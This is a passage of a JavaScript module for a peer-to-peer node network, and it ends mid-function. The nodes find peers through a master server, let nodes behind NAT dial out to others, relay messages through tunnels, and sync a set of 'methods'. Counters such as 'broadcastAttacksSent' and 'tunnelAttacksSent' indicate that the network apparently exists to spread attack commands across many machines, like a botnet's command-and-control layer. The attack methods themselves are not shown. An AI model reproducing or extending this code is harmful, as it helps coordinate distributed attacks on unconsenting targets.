import EventEmitter from 'events';
import { WebSocket, WebSocketServer } from 'ws';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { normalizeMethodsToLocalPaths } from './methodSync.js';
import EncryptionManager from './encryption.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ============================================================
// UPGRADE v5.0: Full DIRECT + REVERSE P2P Support
//
// Key improvements:
// 1. REVERSE nodes connect OUT to DIRECT peers (not wait for inbound)
// 2. Master used as signaling/rendezvous server for discovery
// 3. DIRECT nodes maintain persistent relay for REVERSE nodes
// 4. Tunnel multiplexing: REVERSE↔DIRECT↔REVERSE bridging
// 5. Heartbeat-based keep-alive for all connection types
// 6. Auto-reconnect with exponential backoff for both modes
// 7. Capability negotiation on handshake (mode, relay, tunnel)
// ============================================================

class P2PHybridNode extends EventEmitter {
  constructor(config, executor, methodsConfig) {
    super();

    this.config = config;
    this.executor = executor;
    this.methodsConfig = methodsConfig || {};
    this.nodeId = config.NODE.ID;
    this.nodeIp = config.NODE.IP;
    this.nodePort = config.SERVER.PORT;
    this.nodeMode = 'DIRECT'; // will be updated via setNodeMode()

    // --- Peer state ---
    this.peers = new Map();           // nodeId -> peerInfo (connected)
    this.connectionLocks = new Map(); // nodeId -> lockTimestamp
    this.knownPeers = new Map();      // nodeId -> peerMeta (discovered)
    this.peerBlacklist = new Map();   // nodeId -> {reason, until}

    // --- REVERSE support ---
    // reversePeers: REVERSE nodes that have "registered" with this DIRECT node
    // so we can relay messages to them. Key = nodeId, value = ws socket
    this.reversePeers = new Map();

    // pendingRelayRequests: for REVERSE node waiting for DIRECT to reach target
    this.pendingRelayRequests = new Map(); // requestId -> {resolve, reject, timeout}

    // --- Referral system ---
    this.receivedReferrals = new Map();
    this.referralTimestamps = new Map();

    // --- Message queue ---
    this.messageQueue = new Map(); // nodeId -> [{message, timestamp}]

    // --- REVERSE peer registry ---
    // knownReversePeers: map of reverseNodeId -> relayNodeId (DIRECT yang jadi relay-nya)
    // Diisi saat DIRECT node broadcast peer_reverse_list ke peers-nya
    // Dipakai oleh sendViaTunnel untuk tahu via DIRECT mana harus tunnel
    this.knownReversePeers = new Map();

    // --- Methods versioning ---
    this.methodsVersionHash = null;
    this.methodsLastUpdate = Date.now();
    this.methodUpdatePropagationLock = new Map();

    // --- File cache ---
    this.fileCache = new Map();

    // --- WebSocket server (for incoming connections) ---
    this.wss = null;
    this.isServerReady = false;

    // --- Stats ---
    this.stats = {
      directConnections: 0,
      relayedConnections: 0,
      reverseNodeConnections: 0,     // NEW: REVERSE nodes that connected to us
      messagesReceived: 0,
      messagesSent: 0,
      messagesQueued: 0,
      messagesRelayed: 0,
      peersDiscovered: 0,
      connectionAttempts: 0,
      connectionFailures: 0,
      connectionSuccesses: 0,
      methodSyncsFromPeers: 0,
      methodSyncsToMaster: 0,
      filesShared: 0,
      filesReceived: 0,
      lastDiscovery: null,
      lastAutoConnect: null,
      lastMethodSync: null,
      referralsSent: 0,
      referralsReceived: 0,
      connectionsViaReferral: 0,
      requestHandlersCleaned: 0,
      memoryLeaksPrevent: 0,
      encryptedMessagesSent: 0,
      encryptedMessagesReceived: 0,
      plainMessagesSent: 0,
      plainMessagesReceived: 0,
      broadcastAttacksSent: 0,
      broadcastAttacksFailed: 0,
      tunnelMessagesForwarded: 0,    // messages forwarded via tunnel
      reverseHandshakes: 0,          // successful reverse handshakes
      tunnelAttacksSent: 0,          // attack requests sent via tunnel
      reverseListBroadcasts: 0,      // peer_reverse_list broadcasts sent
    };

    // --- P2P config ---
    this.p2pConfig = {
      enabled: config.P2P?.ENABLED !== false,
      discoveryInterval: config.P2P?.DISCOVERY_INTERVAL || 60000,
      peerTimeout: config.P2P?.PEER_TIMEOUT || 180000,
      maxPeers: config.P2P?.MAX_PEERS || 50,
      autoConnect: config.P2P?.AUTO_CONNECT !== false,
      relayFallback: config.P2P?.RELAY_FALLBACK !== false,
      heartbeatInterval: config.P2P?.HEARTBEAT_INTERVAL || 30000,
      connectionTimeout: config.P2P?.CONNECTION_TIMEOUT || 10000,
      maxConnectionAttempts: 3,
      connectionBackoffMs: 5000,
      blacklistDuration: 300000,
      messageQueueSize: 100,
      autoConnectDelay: 10000,
      cleanupInterval: 60000,
      methodSyncInterval: 120000,
      preferP2PSync: true,
      maxReferralsToSend: 5,
      referralExpiryMs: 300000,
      connectionLockTimeout: 30000,
      maxPropagationHops: 5,
      propagationCooldown: 10000,

      // NEW: REVERSE mode P2P config
      reverseP2PEnabled: true,           // REVERSE nodes also do P2P
      reverseReconnectInterval: 30000,   // How often REVERSE tries to reconnect to known DIRECT peers
      reverseHeartbeatInterval: 45000,   // REVERSE→DIRECT keep-alive interval
      reverseRegistrationTimeout: 15000, // Timeout for REVERSE to register with DIRECT
      masterSignalingEnabled: true,      // Use master as signaling server
      masterSignalingInterval: 90000,    // Poll master for new peers every 90s
    };

    // --- Intervals ---
    this.discoveryInterval = null;
    this.peerCleanupInterval = null;
    this.heartbeatInterval = null;
    this.autoConnectInterval = null;
    this.methodSyncInterval = null;
    this.handlerCleanupInterval = null;
    this.reverseReconnectInterval = null;  // NEW
    this.masterSignalingInterval = null;   // NEW

    this.isShuttingDown = false;

    // --- Request handler registry (for promise-based request/response) ---
    this.requestHandlers = new Map();
    this.requestHandlerTimestamps = new Map();

    // --- Master connectivity ---
    this.masterReachable = false;
    this.lastMasterCheck = null;

    // --- Encryption ---
    this.encryptionManager = null;
    if (config.ENCRYPTION?.ENABLED) {
      try {
        this.encryptionManager = new EncryptionManager({
          ...config,
          ENCRYPTION: {
            ...config.ENCRYPTION,
            NODE_ID: config.NODE.ID
          }
        });
        console.log('[P2P] Encryption manager initialized', {
          enabled: true,
          algorithm: config.ENCRYPTION.ALGORITHM,
          version: config.ENCRYPTION.VERSION
        });
      } catch (error) {
        console.error('[P2P] Failed to initialize encryption:', error.message);
        this.encryptionManager = null;
      }
    }

    console.log('[P2P] P2P Hybrid Node initialized (v5.0 DIRECT+REVERSE)', {
      nodeId: this.nodeId,
      enabled: this.p2pConfig.enabled,
      maxPeers: this.p2pConfig.maxPeers,
      encryption: !!this.encryptionManager
    });
  }

  // ==========================================================
  // ENCRYPTION HELPERS
  // ==========================================================

  setEncryptionManager(manager) {
    if (manager && manager instanceof EncryptionManager) {
      this.encryptionManager = manager;
      console.log('[P2P] Encryption manager updated');
    }
  }

  isEncryptionEnabled() {
    return !!(
      this.encryptionManager &&
      this.config.ENCRYPTION?.ENABLED &&
      typeof this.encryptionManager.createSecureMessage === 'function' &&
      typeof this.encryptionManager.processSecureMessage === 'function'
    );
  }

  encryptMessage(message, messageType = 'p2p_message') {
    if (!this.isEncryptionEnabled()) {
      return { encrypted: false, data: message };
    }
    try {
      const encrypted = this.encryptionManager.createSecureMessage(message, messageType);
      return { encrypted: true, data: encrypted };
    } catch (error) {
      console.error('[P2P-ENCRYPT] Failed to encrypt message:', error.message);
      return { encrypted: false, data: message };
    }
  }

  decryptMessage(data) {
    if (!data || typeof data !== 'object') {
      this.stats.plainMessagesReceived++;
      return { success: true, encrypted: false, data };
    }

    if (data.envelope === 'secure' && this.isEncryptionEnabled()) {
      try {
        const result = this.encryptionManager.processSecureMessage(data);
        if (result.success) {
          this.stats.encryptedMessagesReceived++;
          return { success: true, encrypted: true, data: result.data, metadata: result.metadata };
        }
        console.error('[P2P-DECRYPT] Failed to decrypt:', result.error);
        return { success: false, encrypted: true, error: result.error };
      } catch (error) {
        console.error('[P2P-DECRYPT] Decryption error:', error.message);
        return { success: false, encrypted: true, error: error.message };
      }
    } else if (data.envelope === 'plain') {
      this.stats.plainMessagesReceived++;
      return { success: true, encrypted: false, data: data.payload };
    }

    this.stats.plainMessagesReceived++;
    return { success: true, encrypted: false, data };
  }

  // ==========================================================
  // NODE MODE
  // ==========================================================

  setNodeMode(mode) {
    this.nodeMode = mode;
    console.log(`[P2P] Node mode set to: ${mode}`);

    if (mode === 'REVERSE' && this.isServerReady) {
      const delayMs = this.p2pConfig.masterSignalingEnabled ? 6000 : 500;
      console.log(`[P2P] REVERSE mode: will attempt outbound connect in ${delayMs}ms`);
      setTimeout(() => {
        if (!this.isShuttingDown) {
          this._scheduleReverseOutboundConnect();
        }
      }, delayMs);
    }
  }

  // ==========================================================
  // METHODS CONFIG
  // ==========================================================

  updateMethodsConfig(newConfig) {
    if (newConfig && typeof newConfig === 'object') {
      this.methodsConfig = newConfig;
      this.updateMethodsVersion();
      console.log(`[P2P] Methods config updated: ${Object.keys(this.methodsConfig).length} methods`);
      return true;
    }
    return false;
  }

  updateMethodsVersion() {
    try {
      const keys = Object.keys(this.methodsConfig).sort();
      const normalized = JSON.stringify(this.methodsConfig, keys);
      this.methodsVersionHash = crypto.createHash('sha256').update(normalized).digest('hex');
      this.methodsLastUpdate = Date.now();
    } catch (error) {
      console.error('[P2P-METHODS] Failed to update version hash:', error.message);
    }
  }

  // ==========================================================
  // SERVER STARTUP
  // ==========================================================

  async startP2PServer(fastifyServer) {
    if (!this.p2pConfig.enabled) {
      console.log('[P2P] P2P is disabled');
      return false;
    }

    if (this.isServerReady && this.wss) {
      console.log('[P2P-SERVER] P2P server already started');
      return true;
    }

    try {
      this.wss = new WebSocketServer({
        noServer: true,
        clientTracking: true,
        perMessageDeflate: false
      });

      fastifyServer.server.on('upgrade', (request, socket, head) => {
        try {
          const url = new URL(request.url, `http://${request.headers.host}`);
          if (url.pathname === '/p2p') {
            this.wss.handleUpgrade(request, socket, head, (ws) => {
              this.wss.emit('connection', ws, request);
            });
          } else {
            socket.destroy();
          }
        } catch (error) {
          console.error('[P2P-SERVER] Upgrade error:', error.message);
          socket.destroy();
        }
      });

      this.wss.on('connection', (ws, request) => {
        this.handleIncomingPeerConnection(ws, request);
      });

      this.wss.on('error', (error) => {
        console.error('[P2P-SERVER] WebSocket server error:', error.message);
      });

      this.isServerReady = true;
      console.log(`[P2P-SERVER] P2P server started on port ${this.nodePort} (encryption: ${this.isEncryptionEnabled()})`);

      this.updateMethodsVersion();

      await this.checkMasterConnectivity();

      // Start all background tasks
      // Master signaling DULU (3s) supaya knownPeers terisi sebelum autoConnector
      setTimeout(() => this.startMasterSignaling(), 3000);
      setTimeout(() => this.startPeerCleanup(), 5000);
      setTimeout(() => this.startPeerHeartbeat(), 4000);
      setTimeout(() => this.startHandlerCleanup(), 6000);
      // autoConnector jalan setelah signaling punya waktu populate knownPeers
      setTimeout(() => this.startAutoConnector(), 12000);
      setTimeout(() => this.startMethodSyncChecker(), 30000);
      // startReverseReconnect: aktif di semua mode, no-op jika bukan REVERSE
      setTimeout(() => this.startReverseReconnect(), 8000);
      // startPeerDiscovery digantikan startMasterSignaling yang lebih lengkap

      console.log('[P2P-SERVER] Background tasks scheduled');
      return true;

    } catch (error) {
      console.error('[P2P-SERVER] Failed to start P2P server:', error.message);
      this.cleanup();
      return false;
    }
  }

  // ==========================================================
  // NEW: MASTER SIGNALING
  // Pull peer list from master periodically (both DIRECT & REVERSE)
  // This is the primary way REVERSE nodes discover DIRECT peers
  // ==========================================================

  startMasterSignaling() {
    if (!this.p2pConfig.masterSignalingEnabled) return;
    if (!this.config.MASTER?.URL) return;

    if (this.masterSignalingInterval) {
      clearInterval(this.masterSignalingInterval);
    }

    console.log(`[P2P-SIGNAL] Master signaling started (every ${this.p2pConfig.masterSignalingInterval}ms)`);

    // Run immediately
    this._doMasterSignaling();

    this.masterSignalingInterval = setInterval(() => {
      if (!this.isShuttingDown) {
        this._doMasterSignaling();
      }
    }, this.p2pConfig.masterSignalingInterval);
  }

  async _doMasterSignaling() {
    if (!this.config.MASTER?.URL) return;

    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 10000);

      const response = await globalThis.fetch(`${this.config.MASTER.URL}/api/nodes`, {
        signal: controller.signal,
        headers: { 'X-Node-ID': this.nodeId, 'X-Node-Mode': this.nodeMode }
      });

      clearTimeout(timeout);

      if (!response.ok) {
        this.masterReachable = false;
        return;
      }

      this.masterReachable = true;
      this.lastMasterCheck = Date.now();
      this.stats.lastDiscovery = Date.now();

      const data = await response.json();
      const nodes = Array.isArray(data.nodes) ? data.nodes : [];

      let newPeers = 0;
      const now = Date.now();

      for (const node of nodes) {
        if (!node.node_id || node.node_id === this.nodeId) continue;

        const normalizedPort = this.normalizePort(node.port);
        // FIX: operator precedence bug — gunakan parentheses agar OR dievaluasi dulu
        // node.mode bisa 'DIRECT'/'REVERSE', fallback ke connection_type check
        const nodeMode = node.mode
          ? node.mode
          : (node.connection_type === 'websocket' ? 'REVERSE' : 'DIRECT');

        // For DIRECT nodes: store as potential P2P peers
        // For REVERSE nodes: they cannot accept inbound, skip direct connect
        if (nodeMode === 'REVERSE') {
          // REVERSE nodes can only be reached if THEY connect to us
          // Just record them in knownPeers for reference
          const existing = this.knownPeers.get(node.node_id);
          if (!existing) {
            newPeers++;
          }
          this.knownPeers.set(node.node_id, {
            nodeId: node.node_id,
            ip: node.ip || null,
            port: normalizedPort,
            mode: 'REVERSE',
            reachable: false,    // REVERSE nodes are NOT directly reachable
            canConnectTo: false, // We cannot connect TO a REVERSE node
            capabilities: null,
            methodsVersion: node.methods_version || null,
            methodsCount: node.methods_count || 0,
            lastUpdate: now
          });
        } else {
          // DIRECT node — we can connect to it
          const existing = this.knownPeers.get(node.node_id);
          if (!existing) {
            newPeers++;
            this.stats.peersDiscovered++;
          }
          this.knownPeers.set(node.node_id, {
            nodeId: node.node_id,
            ip: node.ip,
            port: normalizedPort,
            mode: 'DIRECT',
            reachable: node.reachable !== false,
            canConnectTo: true,
            capabilities: null,
            methodsVersion: node.methods_version || null,
            methodsCount: node.methods_count || 0,
            lastUpdate: now
          });
        }
      }

      const directCount = Array.from(this.knownPeers.values()).filter(p => p.canConnectTo).length;
      const reverseCount = Array.from(this.knownPeers.values()).filter(p => !p.canConnectTo).length;

      console.log(
        `[P2P-SIGNAL] Peers from master: ${nodes.length} total, ` +
        `${directCount} DIRECT (connectable), ${reverseCount} REVERSE, ` +
        `${newPeers} new. Mode: ${this.nodeMode}`
      );

      if (nodes.length === 0) {
        console.log('[P2P-SIGNAL] ⚠ Master returned empty nodes list — check /api/nodes endpoint');
      }

      // Jika kita REVERSE node, connect keluar ke DIRECT peers yang baru ditemukan
      if (this.nodeMode === 'REVERSE') {
        if (directCount > 0) {
          this._scheduleReverseOutboundConnect();
        } else {
          console.log('[P2P-SIGNAL] ⚠ REVERSE node: no DIRECT peers found to connect to');
        }
      }

    } catch (error) {
      // Don't log AbortError noisily
      if (error.name !== 'AbortError') {
        console.log('[P2P-SIGNAL] Master signaling error:', error.message);
      }
      this.masterReachable = false;
    }
  }

  // ==========================================================
  // NEW: REVERSE NODE OUTBOUND CONNECTION
  // REVERSE nodes actively connect TO DIRECT peers they know about
  // ==========================================================

  _scheduleReverseOutboundConnect() {
    if (this.isShuttingDown) return;
    if (!this.p2pConfig.reverseP2PEnabled) return;

    // Debounce: don't schedule if already scheduled recently
    if (this._reverseConnectScheduled) return;
    this._reverseConnectScheduled = true;

    setTimeout(() => {
      this._reverseConnectScheduled = false;
      this._doReverseOutboundConnect();
    }, 3000);
  }

  async _doReverseOutboundConnect() {
    if (this.isShuttingDown) return;

    const availableSlots = this.p2pConfig.maxPeers - this.peers.size - this.connectionLocks.size;
    if (availableSlots <= 0) return;

    // Find DIRECT peers we know but are not connected to
    const directPeers = Array.from(this.knownPeers.values()).filter(peer => {
      return peer.canConnectTo &&
        peer.mode === 'DIRECT' &&
        peer.ip &&
        peer.port &&
        peer.nodeId !== this.nodeId &&
        !this.peers.has(peer.nodeId) &&
        !this.connectionLocks.has(peer.nodeId) &&
        !this.isBlacklisted(peer.nodeId);
    });

    if (directPeers.length === 0) {
      const total = this.knownPeers.size;
      const nonConnectable = Array.from(this.knownPeers.values()).filter(p => !p.canConnectTo).length;
      const alreadyConnected = Array.from(this.knownPeers.values()).filter(p => this.peers.has(p.nodeId)).length;
      const blacklisted = Array.from(this.knownPeers.values()).filter(p => this.isBlacklisted(p.nodeId)).length;
      console.log(
        `[P2P-REVERSE-OUT] No connectable DIRECT peers. ` +
        `Known: ${total}, REVERSE/non-connectable: ${nonConnectable}, ` +
        `already-connected: ${alreadyConnected}, blacklisted: ${blacklisted}`
      );
      return;
    }

    console.log(`[P2P-REVERSE-OUT] REVERSE node connecting to ${Math.min(directPeers.length, availableSlots)} DIRECT peer(s)...`);

    let connected = 0;
    for (const peer of directPeers.slice(0, availableSlots)) {
      if (this.isShuttingDown) break;
      try {
        const result = await this.connectToPeer(peer.nodeId, peer);
        if (result.success && !result.existing) {
          connected++;
          console.log(`[P2P-REVERSE-OUT] ✓ Connected to DIRECT peer ${peer.nodeId} at ${peer.ip}:${peer.port}`);
        }
      } catch (err) {
        console.error(`[P2P-REVERSE-OUT] Error connecting to ${peer.nodeId}:`, err.message);
      }
      // Small delay between connections
      await new Promise(r => setTimeout(r, 1000));
    }

    if (connected > 0) {
      console.log(`[P2P-REVERSE-OUT] ✓ Connected to ${connected} DIRECT peer(s)`);
    }
  }

  // NEW: Start periodic REVERSE reconnect checker
  startReverseReconnect() {
    if (this.reverseReconnectInterval) clearInterval(this.reverseReconnectInterval);

    this.reverseReconnectInterval = setInterval(() => {
      if (this.isShuttingDown) return;
      if (this.nodeMode !== 'REVERSE') return;

      // If we have fewer peers than expected, try to reconnect
      const directPeerCount = Array.from(this.peers.values())
        .filter(p => p.mode === 'DIRECT' || p.remoteMode === 'DIRECT').length;

      if (directPeerCount < 2) {
        console.log(`[P2P-REVERSE-RECONNECT] Only ${directPeerCount} DIRECT peer(s), attempting reconnect...`);
        this._scheduleReverseOutboundConnect();
      }
    }, this.p2pConfig.reverseReconnectInterval);

    console.log('[P2P-REVERSE-RECONNECT] REVERSE reconnect checker started');
  }

  // ==========================================================
  // INCOMING CONNECTION HANDLER
  // ==========================================================

  handleIncomingPeerConnection(ws, request) {
    const remoteNodeId = request.headers['x-node-id'];
    const remoteIpRaw = request.headers['x-forwarded-for'] || request.socket.remoteAddress;
    const remoteMode = request.headers['x-node-mode'] || 'DIRECT';
    const remotePortHeader = request.headers['x-node-port'];
    const remotePort = remotePortHeader ? parseInt(remotePortHeader, 10) : null;
    const remoteEncryption = request.headers['x-encryption'] === 'enabled';

    const remoteIp = typeof remoteIpRaw === 'string'
      ? remoteIpRaw.replace('::ffff:', '')
      : remoteIpRaw;

    console.log('[P2P-SERVER] New incoming peer connection:', {
      remoteNodeId,
      remoteIp,
      remotePort,
      remoteMode,
      encryption: remoteEncryption
    });

    if (!remoteNodeId) {
      ws.close(4000, 'Missing node ID');
      return;
    }

    if (remoteNodeId === this.nodeId) {
      ws.close(4001, 'Cannot connect to self');
      return;
    }

    if (this.isBlacklisted(remoteNodeId)) {
      ws.close(4002, 'Blacklisted');
      return;
    }

    // NEW: Detect if this is a REVERSE node connecting to us (a DIRECT node)
    // REVERSE nodes connecting to DIRECT create a "reverse tunnel" entry
    const isReverseNode = remoteMode === 'REVERSE';

    // Update known peers
    this.knownPeers.set(remoteNodeId, {
      nodeId: remoteNodeId,
      ip: remoteIp,
      port: remotePort,
      mode: remoteMode,
      reachable: !isReverseNode, // REVERSE nodes are not directly reachable
      canConnectTo: !isReverseNode,
      capabilities: null,
      methodsVersion: null,
      methodsCount: 0,
      lastUpdate: Date.now(),
      supportsEncryption: remoteEncryption,
      // NEW: track that this is a REVERSE node connecting to us
      isReverseNode
    });

    if (this.peers.size >= this.p2pConfig.maxPeers) {
      const referrals = this.getPeerReferrals(remoteNodeId);
      this.stats.referralsSent++;

      try {
        const rejectMessage = {
          type: 'connection_rejected',
          reason: 'max_peers_reached',
          maxPeers: this.p2pConfig.maxPeers,
          currentPeers: this.peers.size,
          referrals,
          referralCount: referrals.length,
          nodeInfo: { nodeId: this.nodeId, ip: this.nodeIp, port: this.nodePort }
        };
        const encrypted = this.encryptMessage(rejectMessage, 'connection_rejected');
        ws.send(JSON.stringify(encrypted.data));
      } catch (error) {
        console.error('[P2P-SERVER] Failed to send referrals:', error.message);
      }

      setTimeout(() => ws.close(4003, 'Max peers reached'), 500);
      return;
    }

    if (this.peers.has(remoteNodeId)) {
      console.log('[P2P-SERVER] Peer already connected, replacing old connection');
      const oldPeer = this.peers.get(remoteNodeId);
      try { oldPeer.ws.close(); } catch {}
      this.peers.delete(remoteNodeId);
    }

    const now = Date.now();
    const peerInfo = {
      ws,
      nodeId: remoteNodeId,
      ip: remoteIp,
      port: remotePort,
      mode: this.nodeMode,      // OUR mode
      remoteMode: remoteMode,   // THEIR mode — NEW field
      connected: true,
      direct: true,
      isReverseNode,            // NEW
      lastSeen: now,
      lastHeartbeat: now,
      messagesReceived: 0,
      messagesSent: 0,
      connectedAt: now,
      capabilities: null,
      methodsVersion: null,
      methodsCount: 0,
      supportsEncryption: remoteEncryption,
      encryptedMessages: 0,
      plainMessages: 0
    };

    this.peers.set(remoteNodeId, peerInfo);
    this.connectionLocks.delete(remoteNodeId);

    if (isReverseNode) {
      // Track as reverse node for relay purposes
      this.reversePeers.set(remoteNodeId, ws);
      this.stats.reverseNodeConnections++;
      console.log(`[P2P-SERVER] REVERSE node ${remoteNodeId} connected (will act as relay target)`);

      // Beritahu semua peers lain bahwa ada REVERSE baru di pool kita
      // Delay sedikit agar welcome exchange selesai dulu
      setTimeout(() => {
        if (!this.isShuttingDown) {
          this.broadcastReverseList();
        }
      }, 2000);
    }

    this.stats.directConnections++;
    this.stats.connectionSuccesses++;

    // Send welcome with full capabilities including relay support
    const welcomeMessage = {
      type: 'welcome',
      nodeId: this.nodeId,
      ip: this.nodeIp,
      port: this.nodePort,
      mode: this.nodeMode,
      timestamp: now,
      capabilities: {
        encryption: this.isEncryptionEnabled(),
        methods: Object.keys(this.methodsConfig),
        methodsVersion: this.methodsVersionHash,
        methodsCount: Object.keys(this.methodsConfig).length,
        relay: this.p2pConfig.relayFallback && this.masterReachable,
        tunnel: true,          // NEW: supports tunnel/relay for REVERSE nodes
        fileSharing: true,
        referrals: true,
        version: '5.0',
        nodeMode: this.nodeMode  // NEW: tell peer our mode
      }
    };

    const encrypted = this.encryptMessage(welcomeMessage, 'welcome');
    this.sendToPeer(remoteNodeId, encrypted.data);

    // Attach message handler
    ws.on('message', (data) => {
      this.handlePeerMessage(remoteNodeId, data);
    });

    ws.on('close', (code, reason) => {
      console.log(`[P2P] Peer ${remoteNodeId} disconnected (code: ${code})`);
      if (isReverseNode) {
        this.reversePeers.delete(remoteNodeId);
        console.log(`[P2P] REVERSE node ${remoteNodeId} removed from relay pool`);
      }
      this.handlePeerDisconnected(remoteNodeId, code, reason);
    });

    ws.on('error', (error) => {
      console.error(`[P2P] Peer ${remoteNodeId} error:`, error.message);
    });

    ws.on('pong', () => {
      const p = this.peers.get(remoteNodeId);
      if (p) p.lastSeen = Date.now();
    });

    this.emit('peer_connected', {
      nodeId: remoteNodeId,
      ip: remoteIp,
      port: remotePort,
      mode: remoteMode,
      direct: true,
      encrypted: encrypted.encrypted,
      isReverseNode
    });

    this.processQueuedMessages(remoteNodeId);

    console.log(
      `[P2P] Peer ${remoteNodeId} (mode:${remoteMode}) connected ` +
      `(${this.peers.size}/${this.p2pConfig.maxPeers}, reversePool: ${this.reversePeers.size})`
    );
  }

  // ==========================================================
  // OUTBOUND CONNECTION (connectToPeer)
  // Works for both DIRECT and REVERSE nodes connecting out
  // ==========================================================

  async connectToPeer(nodeId, peerInfo, retryAttempt = 0) {
    if (nodeId === this.nodeId) {
      return { success: false, error: 'Cannot connect to self' };
    }

    const normalizedPort = this.normalizePort(peerInfo.port);

    if (peerInfo.ip === this.nodeIp && normalizedPort === this.nodePort) {
      return { success: false, error: 'Cannot connect to self (same IP:port)' };
    }

    // REVERSE nodes cannot be connected TO (they connect out)
    if (peerInfo.mode === 'REVERSE' && peerInfo.canConnectTo === false) {
      return { success: false, error: 'Cannot connect to REVERSE mode node' };
    }

    if (this.peers.has(nodeId)) {
      return { success: true, existing: true };
    }

    if (this.isBlacklisted(nodeId)) {
      return { success: false, error: 'Peer is blacklisted' };
    }

    if (this.connectionLocks.has(nodeId)) {
      const lockTime = this.connectionLocks.get(nodeId);
      if (Date.now() - lockTime < this.p2pConfig.connectionLockTimeout) {
        return { success: false, error: 'Connection already in progress' };
      }
      this.connectionLocks.delete(nodeId);
    }

    const totalConnections = this.peers.size + this.connectionLocks.size;
    if (totalConnections >= this.p2pConfig.maxPeers) {
      return { success: false, error: 'Max peers reached' };
    }

    if (retryAttempt >= this.p2pConfig.maxConnectionAttempts) {
      this.blacklistPeer(nodeId, `Max connection attempts (${retryAttempt}) reached`);
      return { success: false, error: 'Max attempts reached' };
    }

    if (!peerInfo.ip || !normalizedPort) {
      return { success: false, error: 'Missing peer IP or port' };
    }

    this.connectionLocks.set(nodeId, Date.now());
    this.stats.connectionAttempts++;

    try {
      const wsUrl = `ws://${peerInfo.ip}:${normalizedPort}/p2p`;

      console.log(
        `[P2P] Connecting to peer ${nodeId} at ${wsUrl} ` +
        `(attempt ${retryAttempt + 1}, our mode: ${this.nodeMode})`
      );

      const ws = new WebSocket(wsUrl, {
        headers: {
          'X-Node-ID': this.nodeId,
          'X-Node-IP': this.nodeIp || 'unknown',
          'X-Node-Port': this.nodePort.toString(),
          'X-Node-Mode': this.nodeMode,     // Send OUR mode to the remote
          'X-Encryption': this.isEncryptionEnabled() ? 'enabled' : 'disabled'
        },
        handshakeTimeout: this.p2pConfig.connectionTimeout
      });

      return new Promise((resolve) => {
        let resolved = false;
        let timeoutHandle = null;

        const finish = (result, keepLock = false) => {
          if (resolved) return;
          resolved = true;
          if (!keepLock) this.connectionLocks.delete(nodeId);
          if (timeoutHandle) clearTimeout(timeoutHandle);
          resolve(result);
        };

        const maybeRetry = (baseError) => {
          const totalNow = this.peers.size + this.connectionLocks.size - 1;
          if (totalNow >= this.p2pConfig.maxPeers) {
            finish({ success: false, error: 'Max peers reached' });
            return;
          }

          if (retryAttempt < this.p2pConfig.maxConnectionAttempts - 1) {
            const backoff = this.p2pConfig.connectionBackoffMs * (retryAttempt + 1);
            console.log(`[P2P] ${baseError}, retrying in ${backoff}ms...`);
            finish({ success: false, error: baseError, willRetry: true });
            setTimeout(() => {
              this.connectToPeer(nodeId, peerInfo, retryAttempt + 1);
            }, backoff);
          } else {
            finish({ success: false, error: baseError });
          }
        };

        timeoutHandle = setTimeout(() => {
          try { ws.terminate(); } catch {}
          this.stats.connectionFailures++;
          if (this.peers.has(nodeId)) {
            finish({ success: true, existing: true }, true);
            return;
          }
          maybeRetry('Connection timeout');
        }, this.p2pConfig.connectionTimeout);

        ws.on('open', () => {
          if (this.peers.size >= this.p2pConfig.maxPeers) {
            try { ws.close(4003, 'Max peers reached'); } catch {}
            finish({ success: false, error: 'Max peers reached' });
            return;
          }

          const now = Date.now();

          // Attach listeners BEFORE adding to peers map
          ws.on('message', (data) => this.handlePeerMessage(nodeId, data));

          ws.on('close', (code, reason) => {
            console.log(`[P2P] Peer ${nodeId} disconnected (code: ${code})`);
            this.handlePeerDisconnected(nodeId, code, reason);

            // NEW: If we are REVERSE, schedule reconnect to this DIRECT peer
            if (this.nodeMode === 'REVERSE' && !this.isShuttingDown) {
              const peerMeta = this.knownPeers.get(nodeId);
              if (peerMeta && peerMeta.canConnectTo) {
                console.log(`[P2P-REVERSE-OUT] DIRECT peer ${nodeId} disconnected, scheduling reconnect...`);
                setTimeout(() => {
                  if (!this.isShuttingDown && !this.peers.has(nodeId)) {
                    this.connectToPeer(nodeId, peerMeta, 0);
                  }
                }, this.p2pConfig.reverseReconnectInterval);
              }
            }
          });

          ws.on('error', (error) => {
            console.error(`[P2P] Peer ${nodeId} error:`, error.message);
          });

          ws.on('pong', () => {
            const p = this.peers.get(nodeId);
            if (p) p.lastSeen = Date.now();
          });

          const peer = {
            ws,
            nodeId,
            ip: peerInfo.ip,
            port: normalizedPort,
            mode: this.nodeMode,          // OUR mode
            remoteMode: peerInfo.mode || 'DIRECT',  // THEIR mode
            connected: true,
            direct: true,
            isOutbound: true,             // NEW: we initiated this connection
            lastSeen: now,
            lastHeartbeat: now,
            messagesReceived: 0,
            messagesSent: 0,
            connectedAt: now,
            capabilities: peerInfo.capabilities || null,
            methodsVersion: peerInfo.methodsVersion || null,
            methodsCount: peerInfo.methodsCount || 0,
            supportsEncryption: false,
            encryptedMessages: 0,
            plainMessages: 0
          };

          this.peers.set(nodeId, peer);
          this.connectionLocks.delete(nodeId);
          this.stats.directConnections++;
          this.stats.connectionSuccesses++;

          // NEW: Send our self-welcome with mode info
          const selfWelcome = {
            type: 'welcome',
            nodeId: this.nodeId,
            ip: this.nodeIp,
            port: this.nodePort,
            mode: this.nodeMode,
            timestamp: now,
            capabilities: {
              encryption: this.isEncryptionEnabled(),
              methods: Object.keys(this.methodsConfig),
              methodsVersion: this.methodsVersionHash,
              methodsCount: Object.keys(this.methodsConfig).length,
              relay: this.p2pConfig.relayFallback && this.masterReachable,
              tunnel: true,
              fileSharing: true,
              referrals: true,
              version: '5.0',
              nodeMode: this.nodeMode
            }
          };

          const selfWelcomeEncrypted = this.encryptMessage(selfWelcome, 'welcome');
          try {
            ws.send(JSON.stringify(selfWelcomeEncrypted.data));
            peer.messagesSent++;
            if (selfWelcomeEncrypted.encrypted) {
              this.stats.encryptedMessagesSent++;
            } else {
              this.stats.plainMessagesSent++;
            }
            this.stats.messagesSent++;
          } catch (e) {
            console.error(`[P2P] Failed to send self-welcome to ${nodeId}:`, e.message);
          }

          this.emit('peer_connected', {
            nodeId,
            ip: peerInfo.ip,
            port: normalizedPort,
            mode: peerInfo.mode || 'DIRECT',
            direct: true,
            isOutbound: true
          });

          this.processQueuedMessages(nodeId);

